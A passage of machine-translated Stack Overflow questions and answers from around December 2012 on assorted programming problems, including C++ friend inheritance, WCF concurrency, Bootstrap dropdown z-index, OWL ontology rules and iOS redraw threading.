> 时间：2012-12-17T14:58:46.910

检查您的 package.json 中是否有“proto”，发生此错误是因为它找不到依赖项

package.json 例如：

```
{
  "name": "application-name",
  "version": "0.0.1",
  "private": true,
  "scripts": {
    "start": "node app"
  },
  "dependencies": {
    "proto": "*"
  }
} 
```

检查这个： [package.json 中的依赖项是什么 - nodejs](https://stackoverflow.com/questions/10620583/what-is-dependency-in-package-json-nodejs)

# ruby-on-rails - 将 CSV 文件保存在回形针附件中（未找到 <#CSV io_type:File io_path 的处理程序）

> ID：13916303
> 
> 赞同：1
> 
> 时间：2012-12-17T14:44:50.313
> 
> 标签：ruby-on-rails, paperclip

我有一个由 CSV.open(..., "w", ...) 创建的文件，我已将数据写入该文件，由@summary_data 引用，现在想在 my_model 中另存为回形针附件。什么是正确的语法，我试过：

```
my_model.update_attributes(summary_data:  @summary_data) 
```

但它给出了错误：

```
Paperclip::AdapterRegistry::NoHandlerError Exception: No handler found for <#CSV io_type:File io_path:"... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T02:52:18.507

我认为您引用的是写入文件而不是文件本身的数据。您可以随时尝试以下方法：

`file = File.open('path/to/file')`

然后使用：

`my_model.update_attributes(summary_data: @summary_data)`

我在这里假设摘要数据是您所附文件的名称。

# c# - DataGridView 的行标题在排序时丢失标题

> ID：13916306
> 
> 赞同：1
> 
> 时间：2012-12-17T14:45:15.390
> 
> 标签：c#, winforms, sorting, datagridview, datagridrowheader

[我在这里](https://stackoverflow.com/questions/710064/adding-text-to-datagridview-row-header)遵循了一个提示：

```
datagridview1.Rows[0].HeaderCell.Value = "ur text"; 
```

在这个帮助下，我设置了一个方法：

```
private void dataGridView1_DataBindingComplete(object sender, DataGridViewBindingCompleteEventArgs e, DataSet src)
{
    for (int i = 0; i < dataGridView1.Rows.Count; i++)
    {
        dataGridView1.Rows[i].HeaderCell.Value = row_captions[i];
    }
} 
```

它很好地用标题填充了我所有行的标题。当我尝试对任何列进行排序时，就会出现问题。再次调用此方法，即使行以不同的方式排列，标题仍保持相同的顺序。我尝试使用 bool 值，因此它不会像这样再次调用此方法：

```
private first_time = true;

private void dataGridView1_DataBindingComplete(object sender, DataGridViewBindingCompleteEventArgs e, DataSet src)
{
    if(first_time)
    {
        for (int i = 0; i < dataGridView1.Rows.Count; i++)
        {
            dataGridView1.Rows[i].HeaderCell.Value = row_captions[i];
        }
    }
}

private void dataGridView1_Sorted(object sender, EventArgs e)
{
    first_time = false;
} 
```

但是现在，它根本不会添加标题，因为显然行被删除并再次添加，因此失去了它们的属性（如果我错了，请纠正我，因为我不完全确定）。

**有没有办法兼顾两者：维护行的标题并相应地对它们进行排序？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:23:19.807

我试图设置`HeaderCell.Value`事件`CellFormatting`及其相应的排序

```
 private void dataGridView`_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
    {
        if (e.ColumnIndex == 1)
        {
            dataGridView1.Rows[e.RowIndex].HeaderCell.Value = e.Value;
        }
    } 
```

# sql - 使用 oleDb 读取 Excel 编号范围

> ID：13916309
> 
> 赞同：0
> 
> 时间：2012-12-17T14:45:23.770
> 
> 标签：sql, vb.net, excel, oledb, jet

我正在尝试从第 4 行开始选择 B - E 列中的所有内容，其中第 4 行是标题。我的工作表名称是“PRODUCTION_Insurer Index”。

到目前为止，我的研究表明，因为我的工作表名称中有空格，所以我需要将其用单引号括起来并在末尾添加一个 $，这导致我使用以下 SQL：

SELECT * FROM ['PRODUCTION_Insurer Index$'] 选择一切就好了。我在实际选择范围时遇到了麻烦。

此外，我研究了 Ranges 并发现使用 Sheet1 之类的名称，我可以执行 SELECT * FROM [Sheet1$B4:E] 或类似的操作来选择一个范围

但是，以下 SQL 都失败并出现错误：

> Microsoft Jet 数据库引擎找不到对象“PRODUCTION_Insurer Index$B4:E”。确保对象存在并且正确拼写其名称和路径名。

SELECT * FROM ['PRODUCTION_Insurer Index$B4:E']

SELECT * FROM [' PRODUCTION_Insurer Index$'B4:E]

SELECT * FROM ['PRODUCTION_Insurer Index'$B4:E]

SELECT * FROM ['PRODUCTION_Insurer Index$B4:E313']

SELECT * FROM [' PRODUCTION_Insurer Index$'B4:E313]

SELECT * FROM ['PRODUCTION_Insurer Index'$B4:E313]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T16:25:36.897

哦，关闭。尝试...

```
 "Select * From [PRODUCTION_Insurer Index$B4:E313]" 
```

# javascript - 如何正确读取/解析 GA 自定义变量？

> ID：13916319
> 
> 赞同：1
> 
> 时间：2012-12-17T14:46:04.167
> 
> 标签：javascript, google-analytics-api

我很抱歉可能重复（我没有找到答案）

我需要从 cookie 页面读取值，这实际上是“谷歌分析自定义变量”。我们这样设置

```
tracker._setCustomVar(1, 'myvar', 'myvalue', 1); 
```

结果我有变量 __utmv 在cookie中有一些值，即

```
12345678.|1=myvar=myvalue=1 
```

我想知道我是否可以简单地在 'myvar=' 之后和 '=1' 之前获取所有内容？也许有一个“官方”的方式应该怎么做？我不确定该格式是否总是相同/相似，是否可以预期该值以'=1'结尾？如果是这样，如果我的值有子字符串'=1'，我应该关心吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T13:32:02.687

我没有找到一些聪明的方法来解决我的问题，而是简单地解析字符串并从中获取价值。

# c++ - 如何为派生类传播朋友

> ID：13916321
> 
> 赞同：29
> 
> 时间：2012-12-17T14:46:07.730
> 
> 标签：c++, friend

我希望有一个类层次结构，并且只能在工厂内部从它创建对象。

例子：

```
class Base
{
    protected:
        Base(){};
        virtual void Init(){};

    friend class Factory;
};

class SomeClass : public Base
{
    public://I want protected here! Now it's possible to call new SomeClass from anywhere!
        SomeClass(){};
        void Init(){};
};

class Factory
{
    public:
        template<class T>
        T* Get()
        {
            T* obj = new T();
            obj->Init();

            return obj;
        }
};

int main()
{
    Factory factory;
    SomeClass *obj = factory.Get<SomeClass>();
} 
```

我的问题是我希望能够仅从 Factory 中创建对象，但我不想`friend class Factory`在从 Base 派生的每个类中声明。

有没有办法在派生类中传播朋友？有没有其他方法可以实现这种行为？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-17T15:11:05.130

不，这是故意不可能的。

是封装的问题。

假设有一个管理任何密码的类“PswClass”，它与其他类是级联朋友：如果我从 PswClass 继承：

```
 class Myclass : public PswClass {
     .......
 } 
```

通过这种方式，我也许可以访问私有的字段。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-17T15:13:09.547

友谊既不是继承的，也不是传递的，如此处所述：[具有继承的朋友类](https://stackoverflow.com/questions/13844129/friend-class-with-inheritance/13844421#13844421)。

经过一些实验，并利用了这个 hack[如何设置全局容器（C++03）？](https://stackoverflow.com/questions/13899866/how-to-setup-a-global-container-c03/13899981#13899981)，我想我已经找到了一种方法，赋予“工厂”创建对象的独特权利。

这是一个快速而肮脏的代码。（向下滚动以查看 hack。）

```
class Object {};

class Factory {
public:
    // factory is a singleton
    // make the constructor, copy constructor and assignment operator private.
    static Factory* Instance() {
        static Factory instance;
        return &instance;
    }

    public: typedef Object* (*CreateObjectCallback)(); 
    private: typedef std::map<int, CreateObjectCallback> CallbackMap; 

public: 
    // Derived classes should use this to register their "create" methods.
    // returns false if registration fails
    bool RegisterObject(int Id, CreateObjectCallback CreateFn) {
        return callbacks_.insert(CallbackMap::value_type(Id, createFn)).second; 
    }

    // as name suggests, creates object of the given Id type
    Object* CreateObject(int Id) {
        CallbackMap::const_iterator i = callbacks_.find(Id); 
        if (i == callbacks_.end()) { 
            throw std::exception(); 
        } 
        // Invoke the creation function 
        return (i->second)(); 
    }

    private: CallbackMap callbacks_; 
};

class Foo : public Object {
    private: Foo() { cout << "foo" << endl; }
    private: static Object* CreateFoo() { return new Foo(); }

public:
    static void RegisterFoo() {
        Factory::Instance()->RegisterObject(0, Foo::CreateFoo);     
    }
};

class Bar : public Object {
    private: Bar() { cout << "bar" << endl; }
    private: static Object* CreateBar() { return new Bar(); }

public:
    static void RegisterBar() {
        Factory::Instance()->RegisterObject(1, Bar::CreateBar);     
    }
};

// use the comma operator hack to register the create methods
int foodummy = (Foo::RegisterFoo(), 0);
int bardummy = (Bar::RegisterBar(), 0);

int main() {
    Factory::Instance()->CreateObject(0); // create foo object
    Factory::Instance()->CreateObject(1); // create bar object
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-17T14:58:12.317

不，没有办法`friend`从基类继承声明。但是，如果您使用`Base`构造函数`private`，则无法在没有`Factory`帮助的情况下创建派生类的实例。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-17T15:28:18.137

正如其他人已经说过的，友谊是不可继承的。

这看起来像是“抽象工厂”模式的一个很好的候选者。

假设从 base 派生的“SomeClass”es 以多态方式使用。声明一个抽象工厂基础，它创建 Base 对象。从基础派生每个具体工厂，覆盖基础创建方法......

有关示例，请参见[http://en.wikipedia.org/wiki/Abstract_factory_pattern](http://en.wikipedia.org/wiki/Abstract_factory_pattern)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-17T15:00:48.367

你不能那样做。这样做是为了保护封装。请参阅这篇文章：[为什么 C++ 不允许继承友谊？](https://stackoverflow.com/questions/3561648/why-does-c-not-allow-inherited-friendship)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-17T17:31:18.747

为了将来参考， OP 和我之间的[聊天](https://chat.stackoverflow.com/rooms/21277/discussion-between-felics-and-ap)产生的另一个想法，它只适用`friend`于 OP 想要的一次使用。当然，这不是一个通用的解决方案，但在某些情况下它可能很有用。

下面的代码是显示基本思想的最小代码。这需要“集成”到`Factory`代码的其余部分中。

```
class Factory;

class Top { // dummy class accessible only to Factory
private:
    Top() {}
friend class Factory;
};

class Base {
public:    
    // force all derived classes to accept a Top* during construction
    Base(Top* top) {}  
};

class One : public Base {
public:    
    One(Top* top) : Base(top) {}
};

class Factory {
    Factory() {
        Top top;  // only Factory can create a Top object
        One one(&top);  // the same pointer could be reused for other objects
    }
}; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-09-03T08:58:19.700

这不可能。正如其他人所说，友谊不是遗传的。

另一种方法是保护所有类层次结构构造函数，并将工厂函数/类作为朋友添加到您感兴趣的所有类中。

# multithreading - 在 wcf 服务中实现并发的正确方法是什么？

> ID：13916322
> 
> 赞同：1
> 
> 时间：2012-12-17T14:46:10.703
> 
> 标签：multithreading, wcf, c#-4.0, service, concurrency

我正在尝试理解 wcf 中的并发性，并从[这里](http://www.codeproject.com/Articles/89858/WCF-Concurrency-Single-Multiple-and-Reentrant-and#)下载了一个示例代码，并为测试两种方式调用做了一些更改。令我惊讶的是，我看不到两种方式调用的并发效果（尽管我可以看到一种方式调用的并发性）。它是 WCF 并发模型的工作方式吗？（或）我做错了什么？

这是服务代码。

```
[ServiceContract]
public interface IHelloWorldService
{
    [OperationContract(IsOneWay=true)]
    void Call(string ClientName);

    [OperationContract]
    string GetData(int value);

    [OperationContract]
    CompositeType GetDataUsingDataContract(CompositeType composite);
}
[DataContract]
public class CompositeType
{
    bool boolValue = true;
    string stringValue = "Hello ";

    [DataMember]
    public bool BoolValue
    {
        get { return boolValue; }
        set { boolValue = value; }
    }

    [DataMember]
    public string StringValue
    {
        get { return stringValue; }
        set { stringValue = value; }
    }
}
[ServiceBehavior(InstanceContextMode=InstanceContextMode.Single, ConcurrencyMode = ConcurrencyMode.Multiple)]
public class HelloWorldService : IHelloWorldService
{
    public static int counter;

    public HelloWorldService()
    {
        counter++;
    }

    public void Call(string ClientName)
    {            
        Console.WriteLine("Instance:" + counter.ToString() + " Thread:" + Thread.CurrentThread.ManagedThreadId.ToString() + " Time:" + DateTime.Now.ToString() + "\n\n");
        Thread.Sleep(5000);
    }

    public string GetData(int value)
    {
        Console.WriteLine("Instance:" + counter.ToString() + " Thread:" + Thread.CurrentThread.ManagedThreadId.ToString() + " Time:" + DateTime.Now.ToString() + "\n\n");
        Thread.Sleep(5000);
        return value.ToString();
    }

    public CompositeType GetDataUsingDataContract(CompositeType composite)
    {
        Console.WriteLine("Instance:" + counter.ToString() + " Thread:" + Thread.CurrentThread.ManagedThreadId.ToString() + " Time:" + DateTime.Now.ToString() + "\n\n");
        Thread.Sleep(5000);
        return composite;
    }
} 
```

这是服务托管代码。

```
class Program
{
    static void Main(string[] args)
    {
        //Create a URI to serve as the base address

        //Uri httpUrl = new Uri("net.tcp://localhost:8001/HelloWorld");
        Uri httpUrl = new Uri("http://localhost:8010/MyService/HelloWorld");

        //Create ServiceHost
        ServiceHost host
        = new ServiceHost(typeof(ClassLibrary1.HelloWorldService), httpUrl);

        //Add a service endpoint
        host.AddServiceEndpoint(typeof(ClassLibrary1.IHelloWorldService)
        , new WSHttpBinding(), "");

        //Enable metadata exchange
        ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
        smb.HttpGetEnabled = true;
        host.Description.Behaviors.Add(smb);

        ServiceThrottlingBehavior stb = new ServiceThrottlingBehavior();
        stb.MaxConcurrentCalls = 100;
        stb.MaxConcurrentInstances = 100;
        stb.MaxConcurrentSessions = 100;
        host.Description.Behaviors.Add(stb);

        //Start the Service
        host.Open();

        Console.WriteLine("Service is host at " + DateTime.Now.ToString());
        Console.WriteLine("Host is running... Press <Enter> key to stop");
        Console.ReadLine();

    }
} 
```

这是客户端代码。

```
class Program
{
    static int m_NumberOfWorkers = 10;
    static readonly object m_Locker = new object();
    static bool flag_GO = false;
    static Stopwatch m_OverAllStopwatch = new Stopwatch();
    static ConcurrentBag<Stopwatch> m_bagIndividualStopwatch = new ConcurrentBag<Stopwatch>();
    static int m_CompletedWorkers = 0;
    static ServiceReference1.HelloWorldServiceClient m_objProxy;
    static int m_KindOfMethod;
    static void Main(string[] args)
    {
        while(true)
        {
            try
            {
                flag_GO = false;

                Console.WriteLine("Enter number of concurrent clients:");
                m_NumberOfWorkers = Int32.Parse(Console.ReadLine());

                Console.WriteLine("Kind of method (1: One way, 2: Two way 3: Two way using data contract):");
                m_KindOfMethod = Int32.Parse(Console.ReadLine());

                // Create Workers
                List<Thread> lstThreads = new List<Thread>();
                for (int i = 0; i < m_NumberOfWorkers; ++i)
                {
                    lstThreads.Add(new Thread(WaitOnPulse));
                }

                // Start Workers
                for (int i = 0; i < lstThreads.Count; ++i)
                {
                    lstThreads[i].Start();
                }

                m_objProxy = new ServiceReference1.HelloWorldServiceClient();

                m_OverAllStopwatch.Restart();

                // Signal all workers
                lock (m_Locker)
                {
                    flag_GO = true;
                    Monitor.PulseAll(m_Locker);
                }

                // Wait all workers to finish
                for (int i = 0; i < lstThreads.Count; ++i)
                {
                    lstThreads[i].Join();
                }

                m_objProxy.Close();
                m_objProxy = null;
            }
            catch
            {
                return;
            }
        }            
    }

    private static void WaitOnPulse()
    {
        lock (m_Locker)
        {
            while (!flag_GO) Monitor.Wait(m_Locker);
        }
        TestWhatEverYouWant();
        IamDone();
    }

    private static void TestWhatEverYouWant()
    {
        Stopwatch stopWatch = Stopwatch.StartNew();
        //Thread.Sleep(1000);
        switch (m_KindOfMethod)
        {
            case 1:
                m_objProxy.Call(m_NumberOfWorkers.ToString() + "Client Calls");
                break;
            case 2:
                m_objProxy.GetData(m_NumberOfWorkers);
                break;
            case 3:
                ServiceReference1.CompositeType objData = new ServiceReference1.CompositeType();
                m_objProxy.GetDataUsingDataContract(objData);
                break;
        }
        stopWatch.Stop();
        m_bagIndividualStopwatch.Add(stopWatch);
    }

    private static void IamDone()
    {
        Interlocked.Increment(ref m_CompletedWorkers);
        // Summarize results if all workers are done
        if (Interlocked.CompareExchange(ref m_CompletedWorkers, 0, m_NumberOfWorkers) == m_NumberOfWorkers)
        {
            m_OverAllStopwatch.Stop();
            Console.WriteLine("OverAll Elapsed Time: {0}", m_OverAllStopwatch.ElapsedMilliseconds);
            Stopwatch stopWatch;
            while (m_bagIndividualStopwatch.TryTake(out stopWatch))
            //foreach (Stopwatch stopWatch in m_bagIndividualStopwatch)
            {
                Console.WriteLine("Individual Elapsed Time: {0}", stopWatch.ElapsedMilliseconds);
            }
        }
    }
} 
```

这是 Cleint 跟踪：

```
 Enter number of concurrent clients:
    8
    Kind of method (1: One way, 2: Two way 3: Two way using data contract):
    2
    OverAll Elapsed Time: 42022
    Individual Elapsed Time: 42021
    Individual Elapsed Time: 37013
    Individual Elapsed Time: 32008
    Individual Elapsed Time: 26987
    Individual Elapsed Time: 21981
    Individual Elapsed Time: 16980
    Individual Elapsed Time: 11968
    Individual Elapsed Time: 6985 
```

这是服务器跟踪：

```
 Instance:1 Thread:6 Time:12/17/2012 8:09:29 PM

    Instance:1 Thread:5 Time:12/17/2012 8:09:34 PM

    Instance:1 Thread:7 Time:12/17/2012 8:09:39 PM

    Instance:1 Thread:7 Time:12/17/2012 8:09:44 PM

    Instance:1 Thread:5 Time:12/17/2012 8:09:49 PM

    Instance:1 Thread:7 Time:12/17/2012 8:09:54 PM

    Instance:1 Thread:5 Time:12/17/2012 8:09:59 PM

    Instance:1 Thread:7 Time:12/17/2012 8:10:04 PM 
```

对于这些结果，您可以清楚地看到请求是按顺序处理的。理想情况下，我期望所有 8 个并发请求将在 5 秒内完成。但它花了大约 42 秒才完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T13:57:01.333

我的代码中的问题是代理的使用方式。我只为所有并发客户端创建了一个代理，并且所有对服务的调用都是通过这个代理进行的。因此，所有这些呼叫都在频道中排队。***为每个客户端创建一个代理，***模拟wcf负载测试的方式，解决了这个问题。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-18T04:24:20.177

我仍然认为问题出在设置上；代理和源自每个代理的线程数，链接解释得很好。

另请查看以下链接；可能是测试客户端可能有问题。 [求WCF双工“TwoWay”订阅+回调示例](https://stackoverflow.com/questions/3472679/seeking-wcf-duplex-twoway-subscribecallback-example)

# uiimageview - 忽略 setImage 上的图像缓存：

> ID：13916323
> 
> 赞同：1
> 
> 时间：2012-12-17T14:46:10.307
> 
> 标签：uiimageview, cache-control

我有以下代码

```
NSString *myPath = [NSString stringWithFormat:@"../Documents/%@",@"bla.png"];
[imgView setImage:[UIImage imageNamed:myPath]];    // works fine
[self updateMyImage:[UIImage imageNamed:myPath]];  // loads another image as bla.png (works fine)
[imgView setImage:[UIImage imageNamed:myPath]];    // displays the old image, *not* the new one 
```

图像在 updateMyImage 中加载：（我打开它（从模拟器的*磁盘*），它是“**新**”的）但 imgView 显示“**旧**”的。我猜它是一个缓存问题。由于iOS已经加载了`[UIImage imageNamed:@"bla.png"]` 一次，它认为这是同一个。如何“刷新”缓存并告诉它重新加载图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:27:46.207

setImage：从缓存中加载（*正如您正确猜测的那样）。*在“UIImage 类参考”中查找它*（在 xcode 的管理器窗口中）*

它下面几行*给*你答案：使用 initWithContentsOfFile: 方法。因此，在更改图像后，请执行以下操作：

```
 NSString *myAbsolutePath = [NSString stringWithFormat:@"%@/%@", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0],@"bla.png"]];
 UIImage *myImg = [[UIImage alloc] initWithContentsOfFile:myAbsolutePath];
 [imgView setImage:myImg]; 
```

现在 imgView 将拥有新图像（只要 myAbsolutePath 中存在 img 文件）。

# drop-down-menu - twitter bootstrap 下拉菜单的 z-index 问题

> ID：13916326
> 
> 赞同：61
> 
> 时间：2012-12-17T14:46:39.450
> 
> 标签：drop-down-menu, twitter-bootstrap, z-index

我在页面顶部的固定导航栏中使用 twitter 引导下拉菜单。

一切正常，但下拉菜单项显示在其他页面元素后面而不是在它们前面时出现问题。

如果我在页面上有任何东西`position: relative`（如 jquery ui 手风琴或谷歌图表），那么下拉菜单会显示在它后面。尝试更改`z-index`dd 菜单和导航栏的，但没有任何区别。

我可以让菜单位于其他内容之上的唯一方法是将内容更改为`position: fixed;`OR `z-index: -1;` - 但是这两种解决方案都会导致其他问题。

感谢您能给我的任何帮助。

我认为这可能是我误解的 CSS 定位的一些标准问题，所以没有发布任何代码，但如果需要可以做。

谢谢。

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-12-17T14:52:59.620

才明白怎么回事。

我在标题内有导航栏`position: fixed`；

更改了`z-index`标题，它现在可以工作了 - 猜我在容器上看起来不够高，无法设置`z-index`最初的 !#@!?

谢谢。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-09-18T13:41:06.497

带有引导程序 3.0.0 的 windows8 上的 IE 7。

```
.navbar {
  position: static;
}
.navbar .nav > li {
  z-index: 1001;
} 
```

固定的

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-09-11T09:18:44.917

在这里遇到了同样的错误。这对我有用。

```
.navbar {
    position: static;
} 
```

通过将位置设置为静态，这意味着导航栏将像往常一样落入文档流中。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-03-22T10:34:55.347

这将解决它

```
.navbar .nav > li {
z-index: 10000;
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-03-26T16:58:54.990

我遇到了同样的问题，在阅读了这个主题之后，我已经解决了将它添加到我的 CSS 中的问题：

```
.navbar-fixed-top {
    z-index: 10000;
} 
```

因为就我而言，我使用的是固定顶部菜单。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-08-24T14:02:05.090

Bootstrap v3 的问题仍然存在，导航栏和下拉菜单具有相同的 z-index ;-( 我刚刚将 .dropdown-menu z-index 增加到 1001。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-05-28T16:38:53.923

`-webkit-transform`通过从导航栏中删除解决：

`-webkit-transform: translate3d(0, 0, 0);`

[从https://stackoverflow.com/a/12653766/391925](https://stackoverflow.com/a/12653766/391925)掠夺

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2021-04-28T07:57:18.693

在我的情况下，除了`z-index`我必须设置`overflow: visible`父母元素

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2013-09-09T12:25:20.897

这为我修复了它：

```
.navbar-wrapper {
  z-index: 11;
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-08-13T07:35:37.600

只要给

```
position: relative; 
z-index: 999; 
```

到导航栏

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-04-10T13:29:08.220

这对我有用：

```
.dropdown, .dropdown-menu {
  z-index:2;
}
.navbar {
  position: static;
  z-index: 1;
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2016-12-26T09:50:52.847

`transform: translateY(50%);`通过删除属性解决了这个问题。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2020-08-15T02:14:12.037

我遇到了同样的问题，就我而言，因为我在 NavBar 样式中忘记了这一点：溢出：隐藏；

# string-matching - 如何通过字符串匹配将一阶逻辑语句翻译成 Protègè 中的限制？

> ID：13916330
> 
> 赞同：1
> 
> 时间：2012-12-17T14:46:50.693
> 
> 标签：string-matching, ontology, protege, first-order-logic

我正在尝试构建一个本体来推断有关域分类和术语的一些信息，但我遇到了一些概念上的困难。

让我解释一下这个问题。在 Protègè 4.1 中，我创建了 Thing 的 6 个子类：Concept、conceptTitle、ConceptSynonym（用于分类）和 Term、TermTitle、TermSynonym（用于术语）。我还创建了 hasConceptTitle、hasConceptSynonym、hasTermTitle 和 hasTermSynonym 对象关系（带有一些约束）来表示每个概念都有一个（并且只有一个）标题，并且可能有一些同义词，并且每个术语都有一个（并且只有一个）标题和一些同义词。Concept 和 Term 都有另一种关系 isA，为分类赋予 DAG/树结构，而术语具有格结构（换句话说，一个术语可能是多个术语的子类）。

问题来了：我想创建一个概念的子类，比如说“MappedConcept”），它应该是映射概念的集合，即标题等于术语标题的概念集，或者它有同义词等于术语的标题或具有等于术语的同义词的同义词。在一阶逻辑中，这个集合可以表示为：

```
∀x∃y( ∃z((hasConceptTitle(x,z) ∧ hasTermTitle(y,z)) ∨
      ∃z((hasConceptTitle(x,z) ∧ hasTermSynonym(y,z)) ∨
      ∃z((hasConceptSynonym(x,z) ∧ hasTermTitle(y,z)) ∨
      ∃z((hasConceptSynonym(x,z) ∧ hasTermSynonym(y,z)) ) 
```

我怎样才能得到这个？为“ConceptTitle”、“ConceptSynonym”、“TermTitle”和“TermSynonym”定义数据属性？以及如何描述字符串匹配？也许这 4 个类应该只是 Concept 和 Term 类的数据属性？我多次阅读 Matthew Horridge 的实用指南，但我无法将脑海中的实用想法转化为 Protègè 的 ongology。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-21T08:39:07.247

恐怕你不能在 OWL 2 DL 和 Protégé 中做到这一点，Protégé 是 OWL 2 DL 的编辑器，因为据我所知，似乎有必要引入数据类型属性的逆，这在猫头鹰 2 DL。然而，这在 OWL Full 中是可能的，一些深度学习推理者甚至可以处理它。在这里，在龟：

```
<MappedConcept>  a  owl:Class;
    owl:equivalentTo  [
        a  owl:Class;
        owl:unionOf (
            [
                a  owl:Restriction;
                owl:onProperty  <hasConceptTitle>;
                owl:someValuesFrom  [
                    a  owl:Restriction;
                    owl:onProperty  [ owl:inverseOf <hasTermTitle> ];
                    owl:someValuesFrom  <Term>
                ]
            ] [
                a  owl:Restriction;
                owl:onProperty  <hasConceptTitle>;
                owl:someValuesFrom  [
                    a  owl:Restriction;
                    owl:onProperty  [ owl:inverseOf <hasTermSynonym> ];
                    owl:someValuesFrom  <Term>
                ]
            ] [
                a  owl:Restriction;
                owl:onProperty  <hasConceptSynonym>;
                owl:someValuesFrom  [
                    a  owl:Restriction;
                    owl:onProperty  [ owl:inverseOf <hasTermSynonym> ];
                    owl:someValuesFrom  <Term>
                ]
            ] [
                a  owl:Restriction;
                owl:onProperty  <hasConceptSynonym>;
                owl:someValuesFrom  [
                    a  owl:Restriction;
                    owl:onProperty  [ owl:inverseOf <hasTermTitle> ];
                    owl:someValuesFrom  <Term>
                ]
            ]
        )
    ] . 
```

您也可以不使用 OWL，例如使用规则语言。这些规则看起来更接近于你在编程语言中的做法。在 SWRL 中：

```
hasConceptTitle(?x,?z), hasTermTitle(?y,?z) -> MappedConcept(?x)
hasConceptTitle(?x,?z), hasTermSynonym(?y,?z) -> MappedConcept(?x)
hasConceptSynonym(?x,?z), hasTermTitle(?y,?z) -> MappedConcept(?x)
hasConceptSynonym(?x,?z), hasTermSynonym(?y,?z) -> MappedConcept(?x) 
```

# ios - SetNeedsDisplay 不工作

> ID：13916331
> 
> 赞同：10
> 
> 时间：2012-12-17T14:46:54.487
> 
> 标签：ios, setneedsdisplay

我看到了许多与此问题相关的线程，但没有一个解决我的情况（我认为）。

我的情况应该很简单，我的控制器中有一个自定义`UIView`，从我的控制器中，我使用 [ `self.myView setNeedsDisplay`] 并且它运行良好。

当我尝试从内部调用它时遇到问题`UIView`......我有一个通知正在从另一个类发送，并且我的视图正在接收它（这有效）它传递的信息，我更新内部这个视图的属性，而不是我调用 [self `setNeedsDisplay`] 希望用新状态更新我的屏幕，但没有发生任何事情，我`NSLOG`在我的`drawRec`方法中使用了 a，此时它没有被调用，它只是当我的控制器类调用时调用`setNeedsDisplay`，当发生这种情况时，屏幕上会显示之前应该发生的更新......我不知道为什么它之前没有更新......

下面是一些代码：

我的控制器要求更新：（工作正常！）

```
- (void)addNodeToNetwork:(DTINode *)node
{
[self.myNetwork addNodeInTheNetwork:node];
self.gridView.nodesToDraw = [self.myNetwork.nodesInNetwork copy];

CGRect tempRec = CGRectMake(node.nodePosition.x, node.nodePosition.y node.nodePosition.x, node.nodePosition.y);
NSValue *rectObj = [NSValue valueWithCGRect:tempRec]; //transforma o cgrect num objeto

[self.gridView.fatherNodes setValue:rectObj forKey:node.nodeName];
[self.gridView setNeedsDisplay];
} 
```

我的通知方法试图更新我的绘图：（不工作！）

```
- (void) receiveTestNotification:(NSNotification *) notification
{
NSDictionary *userInfo = notification.userInfo;
DTINode *notificationNode = [userInfo objectForKey:@"myNode"];
NSLog(@"Im Here!");
for (DTINode *node in self.nodesToDraw)
{
    NSLog(@"Here too");

    if(node.nodeName == notificationNode.fatherNode)
    {
        CGRect temp = CGRectMake(notificationNode.nodePosition.x, notificationNode.nodePosition.y, node.nodePosition.x, node.nodePosition.y);
        NSValue *tempObj = [NSValue valueWithCGRect:temp];
        [self.fatherNodes setObject:tempObj forKey:notificationNode.nodeName];
        [self setNeedsDisplay];
        NSLog(@"Should REDRAW NOW!"); // It print this but no drawing is made!
    }
}
} 
```

我没有`drawRect`在这里粘贴我的，因为它有效，问题是没有从我的内部调用`UIView setNeedsDisplay`！

任何人都知道为什么这不起作用？？？？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-12-20T13:05:48.370

经过大量测试后，我看到了一些与线程相关的东西，而 setNeedsDisplay 应该只在 mainThread 中调用……除了我从未在此类中启动单独的线程之外，引发通知的类在辅助线程中……显然这导致了这个问题......

为了解决它，我只是强制在主线程中调用 setNeedsDisplay ..

```
dispatch_async(dispatch_get_main_queue(), ^{
            [self setNeedsDisplay];  
}); 
```

斯威夫特 3：

```
DispatchQueue.main.async { [weak self] in
    self?.setNeedsDisplay()
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-07T05:44:38.030

我认为正确的使用方法是：

```
[self setNeedsDisplay:YES]; 
```

虽然我总是很难让它工作:(

# jquery - 最近的 显示未定义

> ID：13916333
> 
> 赞同：1
> 
> 时间：2012-12-17T14:46:57.320
> 
> 标签：jquery

我正在制作一个书签应用程序，我想针对特定目的定位并获取`id`最近的`li`内部任务。我`ul`尝试了这段代码，但它不起作用。希望你们帮帮我

```
<script src="js/jquery.js"></script>
<script>

$(document).ready(function(){

  $("#clicker").click(function(){
    var id = $("#tasks").closest("li").attr("id");
    alert(id);
  });

});

